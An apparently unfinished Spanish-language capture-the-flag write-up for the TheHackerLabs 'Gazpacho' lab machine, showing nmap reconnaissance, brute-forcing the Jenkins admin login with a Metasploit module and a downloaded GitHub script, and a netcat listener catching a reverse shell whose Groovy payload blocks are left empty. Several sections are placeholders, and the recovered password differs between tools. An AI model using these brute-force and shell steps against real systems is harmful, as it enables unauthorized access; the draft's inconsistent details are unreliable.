---
layout: single
title: Gazpacho - TheHackerLabs
excerpt: "."
date: 2025-06-26
classes: wide
header:
  teaser: /assets/images/THL-writeup-gazpacho/_logo.png
  teaser_home_page: true
  icon: /assets/images/thehackerlabs.jpeg
categories:
  - TheHackerLabs
  - Medium Machine
tags:
  - Linux
  - CD/CI Jenkins
  - Brute Force Attack
  - 
  - OSCP Style
  - Metasploit Framework
---
![](/assets/images/THL-writeup-gazpacho/_logo.png)

texto

Herramientas utilizadas:
* *ping*
* *nmap*
* **
* **
* **
* **


<br>
<hr>
<div id="Indice">
	<h1>Índice</h1>
	<ul>
		<li><a href="#Recopilacion">Recopilación de Información</a></li>
			<ul>
				<li><a href="#Ping">Traza ICMP</a></li>
				<li><a href="#Puertos">Escaneo de Puertos</a></li>
				<li><a href="#Servicios">Escaneo de Servicios</a></li>
			</ul>
		<li><a href="#Analisis">Análisis de Vulnerabilidades</a></li>
			<ul>
				<li><a href="#HTTP">Analizando Servicio HTTP</a></li>
				<li><a href="#Jenkins">Analizando Página Web Activa del Puerto 8080</a></li>
			</ul>
		<li><a href="#Explotacion">Explotación de Vulnerabilidades</a></li>
			<ul>
				<li><a href="#fuerzaBruta">Aplicando Fuerza Bruta a Login de Jenkins</a></li>
				<ul>
					<li><a href="#Metasploit">Aplicando Fuerza Bruta con Módulo skdnjasnd de Metasploit Framework</a></li>
					<li><a href="#exploit">Aplicando Fuerza Bruta con Script de GitHub</a></li>
				</ul>
				<li><a href="#"></a></li>
			</ul>
		<li><a href="#Post">Post Explotación</a></li>
			<ul>
				<li><a href="#"></a></li>
			</ul>
		<li><a href="#Links">Links de Investigación</a></li>
	</ul>
</div>



<br>
<br>
<hr>
<div style="position: relative;">
  <h1 id="Recopilacion" style="text-align:center;">Recopilación de Información</h1>
</div>
<br>


<h2 id="Ping">Traza ICMP</h2>

Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
```bash
ping -c 4 192.168.10.150
PING 192.168.10.150 (192.168.10.150) 56(84) bytes of data.
64 bytes from 192.168.10.150: icmp_seq=1 ttl=64 time=8.79 ms
64 bytes from 192.168.10.150: icmp_seq=2 ttl=64 time=1.28 ms
64 bytes from 192.168.10.150: icmp_seq=3 ttl=64 time=1.35 ms
64 bytes from 192.168.10.150: icmp_seq=4 ttl=64 time=1.70 ms

--- 192.168.10.150 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3062ms
rtt min/avg/max/mdev = 1.278/3.278/8.787/3.184 ms
```
Por el TTL sabemos que la máquina usa **Linux**, hagamos los escaneos de puertos y servicios.

<br>

<h2 id="Puertos">Escaneo de Puertos</h2>

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.10.150 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-26 13:51 CST
Initiating ARP Ping Scan at 13:51
Scanning 192.168.10.150 [1 port]
Completed ARP Ping Scan at 13:51, 0.06s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 13:51
Scanning 192.168.10.150 [65535 ports]
Discovered open port 80/tcp on 192.168.10.150
Discovered open port 8080/tcp on 192.168.10.150
Discovered open port 22/tcp on 192.168.10.150
Completed SYN Stealth Scan at 13:51, 9.97s elapsed (65535 total ports)
Nmap scan report for 192.168.10.150
Host is up, received arp-response (0.00093s latency).
Scanned at 2025-06-26 13:51:46 CST for 10s
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE    REASON
22/tcp   open  ssh        syn-ack ttl 64
80/tcp   open  http       syn-ack ttl 64
8080/tcp open  http-proxy syn-ack ttl 64
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 10.15 seconds
           Raw packets sent: 74594 (3.282MB) | Rcvd: 65536 (2.621MB)
```

| Parámetros | Descripción |
|--------------------------|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

Hay 3 puertos abiertos. Tenemos dos páginas web activas, lo que es interesante.

<br>

<h2 id="Servicios">Escaneo de Servicios</h2>

```bash
nmap -sCV -p 22,80,8080 192.168.10.150 -oN targeted
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-26 13:52 CST
Nmap scan report for 192.168.10.150
Host is up (0.00089s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 9c:e0:78:67:d7:63:23:da:f5:e3:8a:77:00:60:6e:76 (ECDSA)
|_  256 4b:30:12:97:4b:5c:47:11:3c:aa:0b:68:0e:b2:01:1b (ED25519)
80/tcp   open  http    Apache httpd 2.4.57 ((Debian))
|_http-server-header: Apache/2.4.57 (Debian)
|_http-title: Login
8080/tcp open  http    Jetty 10.0.20
|_http-server-header: Jetty(10.0.20)
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.63 seconds
```

| Parámetros | Descripción |
|--------------------------|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

De acuerdo al escaneo, la página web del **puerto 80** esta mostrando un login y la página web del **puerto 8080**, no muestra algo como tal, pero el servidor Jetty, pertenecé al **CI/CD Jenkins**.

Primero, veamos qué podemos hacer en el login.


<br>
<br>
<hr>
<div style="position: relative;">
  <h1 id="Analisis" style="text-align:center;">Análisis de Vulnerabilidades</h1>
</div>
<br>


<h2 id="HTTP">Analizando Servicio HTTP</h2>

Entremos:

<p align="center">
<img src="/assets/images/THL-writeup-gazpacho/Captura1.png">
</p>

Es un login simple.

Veamos qué nos dice **Wappalizer**:

<p align="center">
<img src="/assets/images/THL-writeup-gazpacho/Captura2.png">
</p>

Nada como tal.

Si probamos el login, metiedo cualquier usuario y contraseña, obtendremos esta respuesta:

<p align="center">
<img src="/assets/images/THL-writeup-gazpacho/Captura3.png">
</p>

Esto me da a entender que no esta funcionando bien el servidor o que existe un error que provoca el fallo del login.

Podríamos aplicar **Fuzzing** para buscar si existe algún directorio o archivo oculto, pero no encontraremos nada.

Entonces, vayamos a ver la página web del **puerto 8080** que utiliza **Jenkins**.

<br>

<h2 id="Jenkins">Analizando Página Web Activa del Puerto 8080</h2>

Entremos:

<p align="center">
<img src="/assets/images/THL-writeup-gazpacho/Captura4.png">
</p>

Estamos en el login del **CI/CD Jenkins**.

Con **whatweb**, podemos obtener la versión de **Jenkins** que se esta usando:
```bash
hatweb http://192.168.10.150:8080
http://192.168.10.150:8080 [403 Forbidden] Cookies[JSESSIONID.3d4df755], Country[RESERVED][ZZ], HTTPServer[Jetty(10.0.20)], HttpOnly[JSESSIONID.3d4df755], IP[192.168.10.150], Jenkins[2.440.3], Jetty[10.0.20], Meta-Refresh-Redirect[/login?from=%2F], Script, UncommonHeaders[x-content-type-options,x-hudson,x-jenkins,x-jenkins-session]
http://192.168.10.150:8080/login?from=%2F [200 OK] Cookies[JSESSIONID.3d4df755], Country[RESERVED][ZZ], HTML5, HTTPServer[Jetty(10.0.20)], HttpOnly[JSESSIONID.3d4df755], IP[192.168.10.150], Jenkins[2.440.3], Jetty[10.0.20], PasswordField[j_password], Script[application/json,text/javascript], Title[Sign in [Jenkins]], UncommonHeaders[x-content-type-options,x-hudson,x-jenkins,x-jenkins-session,x-instance-identity], X-Frame-Options[sameorigin]
```
Parece que esta usando la **versión 2.440.3**.

Aquí no podremos hacer mucho, pero necesitamos entrar a ese login.

Entonces, es hora de aplicar fuerza bruta.


<br>
<br>
<hr>
<div style="position: relative;">
  <h1 id="Explotacion" style="text-align:center;">Explotación de Vulnerabilidades</h1>
</div>
<br>


<h2 id="fuerzaBruta">Aplicando Fuerza Bruta a Login de Jenkins</h2>

Sabemos que existe un usuario por defecto en **Jenkins**, que es el **usuario admin**.

Pero no sabemos su contraseña, entonces, lo ideal es aplicar fuerza bruta para descubrir la contraseña.

Lo haremos con dos herramientas:
* Metasploit Framework: Módulo `auxiliary/scanner/http/jenkins_login`
* Script de GitHub

Esta vez, no utilizaremos la herramienta **hydra** porque existe un problema que no logre identificar, pero no deja funcionar correctamente **hydra**, dando falsos positivos o ninguna respuesta.

<br>

<h3 id="Metasploit">Aplicando Fuerza Bruta con Módulo skdnjasnd de Metasploit Framework</h3>

Inicia **Metasploit Framework** y escoge el módulo `auxiliary/scanner/http/jenkins_login`:
```bash
msfconsole -q
[*] Starting persistent handler(s)...
msf6 > use auxiliary/scanner/http/jenkins_login
msf6 auxiliary(scanner/http/jenkins_login) >
```

Configura el módulo:
```bash
msf6 auxiliary(scanner/http/jenkins_login) > set PASS_FILE /usr/share/wordlists/rockyou.txt
PASS_FILE => /usr/share/wordlists/rockyou.txt
msf6 auxiliary(scanner/http/jenkins_login) > set RHOSTS 192.168.10.150
RHOSTS => 192.168.10.150
msf6 auxiliary(scanner/http/jenkins_login) > set USERNAME admin
USERNAME => admin
msf6 auxiliary(scanner/http/jenkins_login) > set TARGETURI /
TARGETURI => /
msf6 auxiliary(scanner/http/jenkins_login) > set VERBOSE false
VERBOSE => false
```

Ejecuta el módulo:
```bash
msf6 auxiliary(scanner/http/jenkins_login) > exploit
[+] 192.168.10.150:8080 - Login Successful: admin:12345
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
Una contraseña bastante simple.

Probémosla:

<p align="center">
<img src="/assets/images/THL-writeup-gazpacho/Captura5.png">
</p>

Estamos dentro.

<br>

<h3 id="exploit">Aplicando Fuerza Bruta con Script de GitHub</h3>

Buscando un poco, encontre un script de un usuario de GitHub que aplica fuerza bruta al login de **Jenkins**:
* <a href="https://github.com/blu3ming/Jenkins-Brute-Force" target="_blank">Repositorio de blu3ming: Jenkins-Brute-Force</a>

Vamos a descargarlo:
```bash
wget https://raw.githubusercontent.com/blu3ming/Jenkins-Brute-Force/refs/heads/main/jenkins-brute-force.py
```

Necesitaremos tener instalado el módulo **pwntools**, te recomiendo instalarlo en un entorno virtual:
```bash
pip install pwntools
```

Veamos como funciona:
```bash
chmod +x jenkins-brute-force.py
python jenkins-brute-force.py
[*] Uso: python jenkins-brute-force.py <IP> <PORT> <WORDLIST> <USER>
[*] Ejemplo: python jenkins-brute-force.py 10.10.20.30 8080 rockyou.txt admin
```

Usemoslo:
```bash
python jenkins-brute-force.py 192.168.10.150 8080 /usr/share/wordlists/rockyou.txt admin
[▖] Buscando contrasena...: [1] admin:123456
[▁] Probando...
[*] Credenciales validas admin:123456
```
Excelente, funcionó bien y obtuvimos la misma respuesta.

Continuemos.

<br>

<h2 id="revShell">Obteniendo Reverse Shell desde Consola de Scripts de Jenkins</h2>

Podemos aprovecharnos de la **consola de scripts de Jenkins**, para poder ejecutar una **Reverse Shell** de **Groovy**.


```bash

```

```bash

```

```bash
nc -nvlp 443
listening on [any] 443 ...
```

```bash

```

```bash
nc -nvlp 443
listening on [any] 443 ...
connect to [Tu_IP] from (UNKNOWN) [192.168.10.150] 58542

whoami
jenkins
```

```bash

```




<br>
<br>
<hr>
<div style="position: relative;">
  <h1 id="Post" style="text-align:center;">Post Explotación</h1>
</div>
<br>


<h2 id=""></h2>





<br>
<br>
<div style="position: relative;">
  <h2 id="Links" style="text-align:center;">Links de Investigación</h2>
</div>


links


<br>

# FIN

<footer id="myFooter">
    <!-- Footer para eliminar el botón -->
</footer>

<style>
        #backToIndex {
                display: none;
                position: fixed;
                left: 87%;
                top: 90%;
                z-index: 2000;
                background-color: #81fbf9;
                border-radius: 10px;
                border: none;
                padding: 4px 6px;
                cursor: pointer;
        }
</style>

<a id="backToIndex" href="#Indice">
        <img src="/assets/images/arrow-up.png" style="width: 45px; height: 45px;">
</a>

<script>
    window.onscroll = function() { showButton() };

    function showButton() {
        const scrollPosition = document.documentElement.scrollTop || document.body.scrollTop;
        const indicePosition = document.getElementById("Indice").offsetTop;
        const footerPosition = document.getElementById("myFooter").offsetTop;
        const windowHeight = window.innerHeight;

        const button = document.getElementById("backToIndex");

        // Mostrar el botón si el usuario ha bajado al índice
        if (scrollPosition >= indicePosition && (scrollPosition + windowHeight) < footerPosition) {
            button.style.display = "block";
            button.style.position = "fixed";
            button.style.top = "90%";
        } else {
            button.style.display = "none";
        }
    }
</script>
